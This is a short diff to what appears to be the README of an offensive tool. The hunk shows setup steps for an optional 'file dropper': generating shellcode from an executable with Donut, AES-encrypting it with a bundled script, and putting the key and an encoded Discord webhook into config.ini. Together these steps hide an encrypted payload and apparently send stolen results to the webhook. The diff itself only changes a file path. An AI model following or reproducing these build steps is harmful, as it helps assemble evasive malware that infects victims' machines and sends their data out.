@@ -22,7 +22,7 @@
   discord_webhook=DISCORD_WEBHOOK <--- Put the encoded webhook here
   ```
 - File dropper if wanted:
-  - generate shellcode with [Donut](https://github.com/TheWover/donut) for an executable file to e.g. `shellc.dat`
+  - generate shellcode with [Donut](https://github.com/TheWover/donut) for an executable file to e.g. client\ `shellc.dat`
   - AES encrypt the shellcode file:
     - `python utils\aes_encrypt.py payload\shellc.dat payload\shellc.aes`
     - Copy the output key into your config.ini file like this:
